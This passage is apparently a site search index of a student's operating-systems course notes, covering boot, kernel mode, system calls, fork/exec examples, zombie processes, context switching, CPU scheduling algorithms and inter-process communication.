logical resources: processes, files, arrays</li> </ul> </li> <li>The OS decides who (which running program) gets what resource (share)</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#os-is-complex","title":"OS is complex","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#start-an-os","title":"start an OS","text":"<ul> <li>When a computer boots, it needs to run a first program: the bootstrap program<ul> <li>Stored in Read Only Memory (ROM)</li> <li>Called the \u201cfirmware\u201d or bootloader</li> <li>We use OpenSBI (Supervisor Binary Interface) for our labs</li> </ul> </li> <li>The bootstrap program initializes the computer<ul> <li>Register content, device controller contents, etc.</li> </ul> </li> <li>It then locates and loads the OS kernel into memory</li> <li>The kernel starts the first user-mode process (called \u201cinit\u201d on Linux, \u201claunchd\u201d on Mac OS X).. let's see it...<ul> <li>first user process runs /sbin/init</li> <li>systemd on newer Linux</li> <li>ps \u2013eaf</li> </ul> </li> <li>And then, nothing happens until an event occurs<ul> <li>event: system call, interrupt(timer), hardware instruction ...</li> <li>more on events in a few slides</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#multi-programming","title":"Multi-Programming","text":"<p>Multi-Programming: Modern OSes allow multiple \u201cjobs\u201d (running programs) to reside in memory simultaneously</p> <ul> <li>The OS picks and begins to execute one of the jobs in memory</li> <li>When the job has to wait for \u201csomething\u201d, then the OS picks another job to run</li> <li>This is called a context-switch,  and improves productivity</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#time-sharing","title":"Time-Sharing","text":"<p>Time-Sharing: Multi-programming with rapid context-switching.</p> <p>In modern OSes, jobs are called processes - A process is a running program</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#the-running-os","title":"The Running OS","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#a-note-on-kernel-size","title":"A Note on Kernel Size","text":"<p>As a kernel designer you want to be careful to not use too much memory! - Hence the need to write lean/mean code     - lean a nothing more     - mean a single-minded</p> <p>Furthermore, there is no memory protection within the kernel - The kernel\u2019s the one saying to a process \u201csegmentation fault\u201d - Nobody\u2019s watching over the kernel  - So one must be extremely careful when developing kernels</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#protected-instructions","title":"Protected Instructions","text":"<p>A subset of instructions of every CPU is restricted in usage: only the OS can execute them, known as protected (or privileged) instructions</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#user-vs-kernel-mode","title":"User vs. Kernel Mode","text":"<p>All modern processors support (at least) two modes of execution: - User mode: In this mode protected instructions cannot be executed - Kernel mode: In this mode all instructions can be executed  </p> <ul> <li>User code executes in user mode</li> <li> <p>OS code executes in kernel mode </p> </li> <li> <p>The mode is indicated by a status bit in a protected control register</p> <ul> <li>The CPU checks this bit before executing a protected instruction</li> <li>Setting the mode bit is, of course, a protected instruction</li> </ul> </li> </ul> <p></p> Knowledge <p>There can be multiple modes, e.g., multiple levels in ARM64</p> <p></p> <p>RISCV mode</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#os-events","title":"OS Events","text":"<ul> <li>An event is an \u201cunusual\u201d change in control flow<ul> <li>A usual change is some \u201cbranch\u201d instruction within a user program for instance</li> </ul> </li> <li>The kernel defines a handler for each event type<ul> <li>i.e., a piece of code executed in kernel mode</li> </ul> </li> <li>Once the system is booted, all entries to the kernel occur as the result of an event<ul> <li>The OS can be seen as a huge event handler</li> </ul> </li> </ul> <p>There are two kinds of events: interrupts and exceptions (or traps or  faults) - The two terms are often confused (even in the textbook) - The term fault often refers to unexpected events - Interrupts are caused by external events     - Hardware-generated     - e.g., some device controller says \u201csomething happened\u201d - Exceptions are caused by executing instructions     - Software-generated     - e.g., the CPU tried to execute a privileged instruction but it\u2019s not in kernel mode</p> processEvent<pre><code>void processEvent(event) {\n    switch (event.type) {\n        case NETWORK_COMMUNICATION:\n            NetworkManager.handleEvent(event);\n            break;\n        case SEGMENTATION_FAULT:\n        case INVALID_MODE:\n            ProcessManager.handleEvent(event);\n            break;\n        ...\n    }\n    return;\n}\n</code></pre>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#timers","title":"Timers","text":"<p>The OS must keep control of the CPU - OS must have a concept of \u201ctime\u201d - Programs cannot gain an unfair share of the computer - One way in which the OS (or kernel) retrieves control is when an interrupt occurs</p> <p>To make sure that an interrupt will occur reasonably soon, we can  use a timer. - The timer interrupts the computer regularly - The OS always makes sure the timer is set before turning over control to user code - Modifying the timer is done via privileged instructions, of course.</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#main-os-services","title":"Main OS Services","text":"<ul> <li>Process Management</li> <li>Memory Management</li> <li>Storage Management</li> <li>I/O Management</li> <li>Protection and Security</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#privileged-instructions","title":"Privileged Instructions","text":"<p>Only privileged instructions can:</p> <ul> <li> Set value of the system timer</li> <li> Read the clock</li> <li> Clear memory</li> <li> Issue a system call instruction</li> <li> Turn off interrupts</li> <li> Modify entries in device-status table</li> <li> Access I/O device</li> </ul> <p>Question</p> <p>https://www.cs.cornell.edu/courses/cs414/2007sp/homework/hw1_soln.pdf </p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#structures","title":"Structures","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#user-operating-system-interface","title":"User Operating System Interface","text":"<ul> <li>Command line interface (CLI) or command interpreter allows direct command entry</li> <li>Graphical User Interface (GUI) User-friendly desktop metaphor interface</li> <li>Touchscreen Interfaces</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#system-call","title":"system call","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#concept","title":"concept","text":"<p>When a user program needs to do something privileged, it calls a system call (e.g., to create a process, write to disk, read from the network card)</p> <p>System Call: A system call is a special kind of trap. </p> <p>\u662f OS \u7ed9 user mode \u7684 interface\uff1b\u4f8b\u5982\uff0c\u8c03\u7528 \"printf\" \u65f6\u3002\u8fd9\u4e5f\u8bf4\u660e system call \u672c\u8eab\u4e0d\u662f privated \uff0c\u56e0\u4e3a user mode \u65e0\u6cd5\u8c03\u7528 privated code.</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#implementation","title":"Implementation","text":"<p>System-call interface maintains a table indexed according to numbers associated with each system call. The system call table is different in different architecture.</p> Knowledge <p></p> <p>When we use \"printf\" (a wrapper of the write system call), actually <code>mov $0x1, %eax</code> and <code>system call</code> :</p> <p></p> <p>Finishing \"printf\" the content, it will return to user mode, and continue.</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#example-cp-intxt-outtxt","title":"example (cp in.txt out.txt)","text":"<p>Question</p> <p>On Linux there is a \u201ccommand\u201d called strace that gives details about which system calls were placed by a program during execution. What happens if we copy a large file ?</p> <p>\u8c03\u7528\u7684 system call \u6570\u91cf\u589e\u52a0\uff0c\u4f46\u662f\u79cd\u7c7b\u4e0d\u53d8\u3002\u4e3b\u8981\u5728\u4e8e read \u7b49 system call \u4e00\u6b21\u80fd\u591f\u64cd\u4f5c\u7684\u5185\u5b58\u5927\u5c0f\u6709\u9650\uff0c\u9700\u8981\u53cd\u590d\u6267\u884c\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#time-spent-in-system-calls","title":"Time Spent in System Calls","text":"<p>The time command is a simple way to time the execution of a program (used like strace).</p> <p>It reports three times: - \u201creal\u201d time: wall-clock time (also called elapsed time, execution time, run time, etc.) - \u201cuser\u201d time: time spent in user code (user mode) - \u201csystem\u201d time\u201d: time spent in system calls (kernel mode)</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#system-call-parameter-passing","title":"System Call Parameter Passing","text":"<ul> <li>direcly from register</li> <li>from a table</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#types-of-system-calls","title":"Types of System Calls","text":"<ul> <li>Process control</li> <li>File management</li> <li>Device management</li> <li>Information maintenance</li> <li>Communications</li> <li>Protection</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#elf-binary-basics_1","title":"ELF binary basics","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#linkers-and-loaders","title":"Linkers and Loaders","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#static-link-vs-dynamic-link","title":"Static link vs dynamic link","text":"<ul> <li>Statically-linked ELF has no .interp section</li> <li>Dynamically-linked ELF has .interp section<ul> <li>need loader</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#operating-system-design-and-implementation","title":"Operating System Design and Implementation","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#user-goals-and-system-goals","title":"User goals and System goals:","text":"<ul> <li>User goals \u2013 operating system should be convenient to use, easy to learn, reliable, safe, and fast</li> <li>System goals \u2013 operating system should be easy to design, implement, and maintain, as well as flexible, reliable, error-free, and efficient</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#important-principle-to-separate","title":"Important principle to separate:","text":"<p>(Allows policy changes without changed implemented mechanism)</p> <ul> <li>Policy: What will be done?</li> <li>Mechanism: How to do it?</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#implementation_1","title":"Implementation","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#microkernels","title":"Microkernels","text":"<p>Moves as much from the kernel into user space.</p> <p>Benefits: - Easier to extend a microkernel - Easier to port the operating system to new architectures - More reliable (less code is running in kernel mode) - More secure</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#module","title":"module","text":"<p>Many modern operating systems implement loadable kernel modules (LKMs):</p> <ul> <li>Uses object-oriented approach</li> <li>Each core component is separate</li> <li>Each talks to the others over known interfaces</li> <li>Each is loadable as needed within the kernel</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#hybrid-systems","title":"Hybrid Systems","text":"<p>macOS and iOS Structure &amp; Android</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#other","title":"other","text":"<p>Kernighan's Law</p> <p>\"Debugging is twice as hard as writing the code in thefirst place. Therefore, if you write the code as cleverly as possible, you are,by definition, not smart enough to debug it.\"</p> <p></p> <p>Summary</p> <p>progress -&gt; scheduling -&gt; IPC -&gt; threads -&gt; synchronization -&gt; deadlock</p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/","title":"3 Process","text":"","tags":["notes"]},{"location":"note/CSys-II/3_Process/#process-concept","title":"Process concept","text":"<ul> <li>How to use computer resources, such as CPU, memory</li> <li>A process is a program<sup>1</sup> in execution</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#memory-layout-of-a-c-program","title":"Memory Layout of a C Program","text":"","tags":["notes"]},{"location":"note/CSys-II/3_Process/#process-control-block-pcb","title":"Process Control Block (PCB)","text":"<p>Information associated with each process (also called task control block): - Allocate a PCB on new process creation;  - Free the PCB on process termination.  - Each process has and only has a PCB.</p> PCB<pre><code>struct PCB {  \n    int pid;  \n    // Process state \u2013 running, waiting, etc.\n    enum { running, ready, waiting } status;  \n    // Scheduling information - priorities,schedule queue pointers\n    int priority;  \n    struct PCB *next_ready;\n    // Program counter \u2013 location of instruction to next execute\n    void *PC;\n    // CPU registers \u2013 contents of all process-centric registers\n    // Memory-management information: page tables, etc.  \n    // Accounting information \u2013 CPU used, clock time elapsed since start, time limits\n    // I/O status information: list of open files and so on.\n}\n</code></pre> <p>Knowledge</p> <p>In Linux, PCB represented by the C structure <code>task_struct</code>.</p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#process-state","title":"Process State","text":"<ul> <li>New: The process is being created</li> <li>Running: Instructions are being executed</li> <li>Waiting: The process is waiting for some events to occur</li> <li>Ready: The process is waiting to be assigned to a processor</li> <li>Terminated: The process has finished execution</li> </ul> <p>\uff08\u4e0b\u9762\u8fd9\u4e2a\u56fe swb \u8001\u5e08\u8bf4\u5fc5\u8003\uff09</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#new-process-creation","title":"new (Process Creation)","text":"<p>A process may create new processes, in which case it becomes a parent, we obtain a tree of processes.</p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#fork","title":"fork()","text":"<ul> <li>fork() creates a new process<ul> <li>The child is is a copy of the parent, but: It has a different pid (and thus ppid); Its resource utilization (so far) is set to 0</li> </ul> </li> <li>fork() returns the child\u2019s pid to the parent, and 0 to the child</li> <li> <p>Both processes continue execution after the call to fork()</p> </li> <li> <p>Pros</p> <ul> <li>Simplicity: Windows CreateProcess requires 10 parameters.</li> <li>Division of Labor: fork builds the skeleton, exec gives it life.</li> <li>Connectivity: Maintains relationships between processes.</li> </ul> </li> <li>Cons<ul> <li>Complexity</li> <li>Poor performance</li> <li>Security issues</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#fork-return-values","title":"fork() return values","text":"<p>Question</p> <p>How does fork() return two values (Return new_pid to parent and zero to child) ?</p> <p>For parent process, fork is just a <code>syscall</code>, similar to write; user mode context (registers) saved: - When: kernel_entry;  - Where: per-process kernel stack, more specifically pt_regs - copy the user space code; new_pid is returned to parent via syscall return value (saved in pt_regs)</p> <p>For child process,also via pt_regs, pt_regs[0] = 0; set the return value to 0 - When will child process start to run and from where?     - When: scheduled (switch to)      - where: from ret_to_fork - ret_from_fork -&gt; ret_to_user -&gt; <code>kernel_exit</code> who restores the pt_regs</p> <p></p> <p>Help</p> <p>\u6211\u4eec\u9700\u8981\u8c28\u8bb0\u4e24\u70b9\uff1a - <code>fork()</code> \u540e\u7684\u5b50\u8fdb\u7a0b\u662f\u63a5\u5728\u4ea7\u751f\u5176\u7684\u6307\u4ee4\u4e4b\u540e\u8fdb\u884c\u7684\uff1b - <code>fork()</code> \u5728\u7236\u8fdb\u7a0b\u7684\u503c\u4e3a\u5b50\u8fdb\u7a0b\u7684 pid\uff0c\u800c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u503c\u4e3a 0</p> \u4e0b\u9762 fprintf \u5c06\u8f93\u51fa\u4ec0\u4e48\u5185\u5bb9\uff1f <pre><code>**include**{: .hash} &lt;stdio.h&gt;\n**include**{: .hash} &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\nint main() {\n    int a = 12;\n    pid_t pid = fork();\n    if (pid == -1) {\n        printf(\"error\");\n    }\n    if (pid &gt; 0) { // PARENT\n        sleep(3); // ask the OS to put me in Waiting\n        printf(\"a = %d\\n\", a);\n        while (1);\n    } else { // CHILD\n        a += 3;\n        while (1);\n    }\n}\n</code></pre> <p>parent \u548c child \u662f\u4e24\u4e2a\u8fdb\u7a0b\uff0c\u4e92\u4e0d\u5e72\u6270\u3002\u6240\u4ee5\u6700\u540e\u8f93\u51fa <code>12</code> \u3002</p> <p></p> <p>[!EXAMPLE]- \u4e0b\u9762\u5c06\u8f93\u51fa\u591a\u5c11\u4e2a <code>hello</code> ?</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n int main() {\n    pid_t pid1, pid2;\n    pid1 = fork();\n    printf(\"hello\\n\");\n    pid2 = fork();\n    printf(\"hello\\n\");\n }\n</code></pre> <p>fork() 1 -pid1-&gt; 2 -&gt; printf -pid2-&gt; 4 -&gt;printf \uff1b\u6545\u8f93\u51fa 2+4 \u6b21\u3002</p> <p>[!EXAMPLE]- \u4e0b\u9762\u4e00\u5171\u521b\u5efa\u4e86\u591a\u5c11\u4e2a\u8fdb\u7a0b\uff1f</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n\nint main(int argc, char* arg[]) {\n    fork();\n    if (fork()) {\n        fork();\n    }\n    fork();\n}\n</code></pre> <p> </p> <p>[!QUESTION]</p> <ol> <li><code>fork()</code> \u7ed3\u675f\u540e\uff0c\u5b50\u8fdb\u7a0b\u5904\u4e8e\u4ec0\u4e48\u72b6\u6001\uff1f</li> <li><code>fork()</code> \u7684\u4e0b\u4e00\u884c\u7684 pc \u5b58\u5728\u54ea\uff1f</li> </ol> <p>Ready.</p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#the-exec-family-of-syscalls","title":"The exec*() Family of Syscalls","text":"<p>The \u201cexec\u201d system call replaces the process image by that of a specific program</p> <p>[!EXAMPLE]-</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n\nint main(int argc, char* arg[]) {\n    if (fork() == 0) { // runs ls\n        char* const argv[] = { \"ls\", \"-l\",\"./\", NULL };\n        execv(\"/bin/ls\", argv);\n    } else {\n        wait(NULL);\n    }\n    // sleep(1);\n    printf(\"Parent process\\n\");\n}\n</code></pre> <p>\u6267\u884c\u4e0a\u8bc9\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\uff08\u5b50\u8fdb\u7a0b\uff09\u6267\u884c\u4e86 <code>ls</code> \u547d\u4ee4\uff1b\u4f46\u662f\u53ea\u8f93\u51fa\u4e86\u4e00\u6b21 <code>Parent process</code> \uff1b\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b50\u8fdb\u7a0b\u5728\u6267\u884c <code>execv</code> \u540e\u6574\u4e2a\u7a0b\u5e8f\u5176\u5b9e\u5c31\u88ab\u66ff\u6362\u4e86\uff0c\u4e4b\u540e\u7684\u5185\u5bb9\u4e0d\u4f1a\u518d\u6267\u884c\u3002</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#ready-wait-to-learn","title":"Ready &amp; Wait (to learn)","text":"<p>Process scheduler selects among ready processes for next execution on CPU core.Maintains scheduling queues of processes - Ready queue \u2013 set of all processes residing in main memory,  ready and waiting to execute - Wait queues \u2013 set of processes waiting for an event (i.e., I/O)</p> <p>Ready and Wait Queues</p> <p></p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#waiting-wait","title":"Waiting wait()","text":"<p>A parent can wait for a child to complete (<code>man 2 wait</code>) - The <code>wait()</code> call     - blocks until any child completes     - returns the pid of the completed child and the child\u2019s exit code - The <code>waitpid()</code> call     - blocks until a specific child completes     - can be made non-blocking with WNOHANG options</p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#terminated-process-terminations","title":"Terminated (Process Terminations)","text":"<ul> <li>A process terminates itself with the exit() system call<ul> <li>This call takes as argument an integer that is called the process\u2019 exit/return/error code</li> </ul> </li> <li>All resources of a process are deallocated by the OS<ul> <li>physical and virtual memory, open files, I/O buffers, ...</li> </ul> </li> <li>A process can cause the termination of another process<ul> <li>Using something called \u201csignals\u201d and the kill() system call</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#zombie-process","title":"Zombie Process","text":"<ul> <li>When a child process terminates, it remains as a zombie in an \u201cundead\u201d state, Until it is \u201creaped\u201d (garbage collected) by the OS, because PCB cannot be deallocated by the child process.<ul> <li>They\u2019re not really processes, they do not consume resources CPU</li> <li>They only consume a slot in memory (PCB), which may eventually fill up and cause fork() to fail</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#getting-rid-of-zombies","title":"Getting rid of zombies","text":"<p>A zombie lingers on until: - its parent has called wait()  for the child, or - its parent dies </p> <ol> <li>When a child exits, a SIGCHLD signal is sent to the parent</li> <li>The parent associates a handler to SIGCHLD</li> <li>The handler calls wait()</li> <li>This way all children deaths are \u201cacknowledged\u201d</li> </ol>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#orphans","title":"Orphans","text":"<ul> <li>An orphan process is one whose parent has died</li> <li>In this case, the orphan is \u201cadopted\u201d by the process with pid 1</li> <li>The process with pid 1 does handle child termination with a handler for SIGCHLD that calls wait, so an orphan never becomes a zombie</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#signal","title":"Signal","text":"","tags":["notes"]},{"location":"note/CSys-II/3_Process/#processes-and-signals","title":"Processes and Signals","text":"<ul> <li>A process can receive signals, i.e., software interrupts</li> <li>Signals have many usages, including process synchronization</li> <li>The OS defines a number of signals, each with a name and a number, and some meaning (using <code>man 7 signal</code>)</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#manipulating-signals","title":"Manipulating Signals","text":"<ul> <li>Each signal causes a default behavior in the process (e.g., a SIGINT signal causes the process to terminate)</li> <li>But most signals can be either ignored or provided with a user-written handler to perform some action</li> <li>Signals like SIGKILL and SIGSTOP  cannot be ignored or handled by the user, for security reasons</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#context-switch","title":"context switch","text":"<p>When CPU switches to another process, the system must save the state of the old process and load the saved state for the new process  via a context switch.</p> <p></p> <p>Context of a process represented in the PCB (task_struct in Linux).</p> <ul> <li>Context switching between two kernel threads, When and where is the context (regs) saved?<ul> <li>When: In context_switch, more specifically in cpu_switch_to</li> <li>Where: In PCB, more specifically in thread_struct</li> <li>All regs are running kernel code, termed kernel context</li> </ul> </li> </ul> <p></p> <ul> <li>Context switching between two user threads<ul> <li>Context switching has to occur in kernel mode (why?  )</li> <li>When and where is the user context (regs) saved?<ul> <li>When: kernel_entry; </li> <li>Where: per-thread kernel stack, more specifically pt_regs</li> <li>when to restore: kernel_exit</li> </ul> </li> <li>When and where is the kernel context (regs) saved?<ul> <li>When: cpu_switch_to; </li> <li>Where: thread_struct</li> </ul> </li> </ul> </li> </ul> <p></p> <p>What's about calling System call?</p> <p></p> <p><code>lr</code> (on arm64) : link register, holding return address</p> <p></p> <p>\u800c\u5728\u6211\u4eec\u5b9e\u73b0\u7684 linux \u5185\u6838\u4e2d\uff0c\u5145\u5f53\u8fd9\u4e00\u529f\u80fd\u7684\u662f mepc/sepc/ra(x1) .</p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#pt_regs-process-trace","title":"pt_regs (process trace)","text":"<p>\u4e0a\u56fe\u4e2d\u7684 stack \u662f kernel space \u7684\u5185\u5b58\u5e03\u5c40\uff1b\u800c\u6211\u4eec\u4e4b\u524d\u6240\u770b\u5230\u7684\u662f user space \u7684\u5185\u5b58\u5e03\u5c40\u3002</p> Question <p>Where does cpu_switch_to() return to? When is the value set?</p> <p>Return to the caller of cpu_switch_to \u00e0 eventually to schedule(). If Process 1 calls schedule() to give up CPU, it eventually returns to right after schedule() </p> Question <p>https://www.cs.cornell.edu/courses/cs414/2007sp/homework/hw1_soln.pdf </p>","tags":["notes"]},{"location":"note/CSys-II/3_Process/#thread","title":"Thread","text":"<p>Why threads? - Multiple tasks of an application can be implemented by threads     - E.g., update display, fetch data, spell checking - Process creation is heavy-weight while thread creation is light-weight - Threads can simplify code, increase efficiency - Kernels are generally multithreaded</p> <p>Thread may be provided either at the user level, or by the kernel - User threads are supported above the kernel and managed without kernel support     - Three thread libraries: POSIX Pthreads, Win32 threads, and Java threads - Kernel threads are supported and managed directly by the kernel     - All contemporary OS supports kernel threads - A relationship must exist between user threads and kernel threads</p> <p>models: - many to one - one to one (used most) - many to many - two levels</p> <ol> <li> <p>program: passive entity (bytes stored on disk as part of an executable file) becomes a process when it\u2019s loaded in memory.\u00a0\u21a9</p> </li> </ol>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/","title":"4 Scheduling","text":"","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#some-definitions","title":"Some definitions","text":"<p>CPU Scheduling</p> <p>the decisions made by the OS to figure out which ready processes/threads should run and for how long</p> <ul> <li>Necessary in multi-programming environments</li> <li>Maximizes CPU utilization so that it\u2019s never idle</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#cpu-io-burst-cycle","title":"CPU-I/O Burst Cycle","text":"<p>Rationale: non-CPU-intensive jobs should really get the CPU quickly on the rare occasions they need them, because they could be interactive processes</p> Question <p>https://www.cs.cornell.edu/courses/cs414/2007sp/homework/hw1_soln.pdf </p>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#cpu-scheduler","title":"CPU Scheduler","text":"<ul> <li>Non-preemptive scheduling: a process holds the CPU until it is willing to give it up<ul> <li>Also called \u201ccooperative\u201d scheduling</li> </ul> </li> <li>Preemptive scheduling: a process can be preempted even though it could have happily continued executing<ul> <li>e.g., after some \u201cyou\u2019ve had enough\u201d timer expires</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#scheduling-decision-points","title":"Scheduling Decision Points","text":"","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#scheduling-criteria","title":"Scheduling Criteria","text":"","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#dispatcher","title":"Dispatcher","text":"","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#scheduling-algorithms","title":"Scheduling Algorithms","text":"<ul> <li>First-Come, First-Served Scheduling</li> <li>Shortest-Job-First Scheduling</li> <li>Round-Robin Scheduling </li> <li>Priority Scheduling </li> <li>Multilevel Queue Scheduling </li> <li>Multilevel Feedback Queue Scheduling</li> </ul> <p>In the following, we will use examples to demonstrate the algorithms - Consider only one CPU burst (in milliseconds) per process - Use the average waiting time as the measure of comparison - In the context of a single CPU that has a single processing core</p>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#first-come-first-served-fcfs-scheduling","title":"First-Come, First-Served (FCFS) Scheduling","text":"progress burst time P1 24 P2 3 P3 3 <ul> <li>if in the order of (P1 P2 P3)<ul> <li>The Gantt chart for the schedule is: </li> <li>Average waiting time: (0 + 24 + 27) / 3 = 17</li> </ul> </li> <li>if in the order of (P2 P3 P1)<ul> <li>The Gantt chart for the schedule is:</li> <li>Average waiting time: (6 + 0 + 3) / 3 = 3</li> </ul> </li> <li>Convoy effect - short process behind long process; Long jobs slow down the whole system</li> <li>FCFS is non-preemptive</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#shortest-job-first-sjf-scheduling","title":"Shortest-Job-First (SJF) Scheduling","text":"<p>SJF is optimal \u2013 gives minimum average waiting time for a given set of processes. A known result is: SJF is provably optimal for average wait time. In the theoretical literature, called: SRPT (Shortest Remaining Processing Time)</p> <p>But the difficulty is knowing the length of the next CPU request; so it is just theoretically optimal.</p> Process Arrival Time Brust Time P1 0 10 P2 2 6 P3 4 7 P4 5 2 <ul> <li>Brust time: the time of a progress need to execution</li> <li>TurnAround time: one progress (finish time - arrival time)</li> <li>Waiting time: one progress (turnaround time - burst time)</li> <li>Response time: one  progress (first begin time - arrival time)</li> <li>Throughput: # of processes that complete execution per time unit.</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#shortest-next-cpu-burst-algorithm","title":"\u201cShortest-next-CPU-burst\u201d algorithm","text":"<p>Non-preemptive, which measn that only after the progress before some progress finishes can the latter begins to run. So the Gantt Chart is :</p> <p></p> <ul> <li>Average turnaround time: (10 + 16 + 21 + 7) / 4 = 13.5</li> <li>Average waiting time: (0 + 10 + 14 + 5) / 4 = 7.25</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#shortest-remaining-time-first-srtf","title":"shortest-remaining-time-first (SRTF)","text":"<p>Preemptive, which means we always find the shortest job to switch to. Now the Gantt Chart is (compare remaining time when: a new progress comes in or a old progress finishes):</p> <p></p> <ul> <li>Average turnaround time: (25 + 8 + 13 + 2) / 4 = 12</li> <li>Average waiting time: (15 + 2 + 6 + 0) / 4 = 5.75</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#round-robin-scheduling","title":"Round-Robin Scheduling","text":"<p>RR Scheduling is preemptive and designed for time-sharing - It defines a time quantum (A fixed interval of time (10-100ms)) - Unless a process is the only READY process, it never runs for longer than a time quantum before giving control to another ready process - Scheduling:     - Pick the first process from the ready queue     - Set a timer to interrupt the process after 1 quantum     - Dispatch the process</p>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#example","title":"example","text":"","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#pick-right-quantum","title":"Pick right quantum:","text":"","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#priority-scheduling","title":"Priority Scheduling","text":"<p>Simply implement the Ready Queue as a Priority Queue. - Priorities can be internal:     - e.g., in SJF it\u2019s the predicted burst time, the number of open files - Priorities can be external:     - e.g., set by users to specify relative importance of jobs</p>","tags":["notes"]},{"location":"note/CSys-II/4_Scheduling/#priority-scheduling-w-round-robin","title":"Priority Scheduling w/ Round-Robin","text":"<ul> <li>The problem: will a low-priority process ever run??<ul> <li>A solution: Priority aging (Increase the priority of a process as it ages)</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/","title":"5 IPC","text":"","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#inter-process-communications-ipcs","title":"Inter-Process Communications (IPCs)","text":"<ul> <li>Processes within a system may be independent or cooperating</li> <li>Independent process: process that cannot affect or be affected by the execution of another process</li> <li>Cooperating process: processes that can affect or be affected by other processes, including sharing data</li> <li>4 Reasons for cooperating processes: information sharing, computation  speedup, modularity, convenience, Security</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#two-models-of-ipc","title":"Two models of IPC","text":"<ul> <li>Shared memory<ul> <li>Low-overhead: a few syscalls initially, and then none </li> <li>More convenient for the user since we\u2019re used to simply reading/writing from/to RAM</li> <li>More difficult to implement in the OS<ul> <li>Note that this is really contrary to the memory protection idea central to multi programming!</li> <li>Major issues is to provide mechanism that will allow the user processes to synchronize their actions when they access shared memory</li> </ul> </li> </ul> </li> <li>Message passing<ul> <li>High-overhead: one syscall per communication operation</li> <li>Useful for exchanging small amounts of data</li> <li>Sometimes cumbersome for the user as code is sprinkled with send/recv operations</li> <li>Simple to implement in the OS</li> </ul> </li> 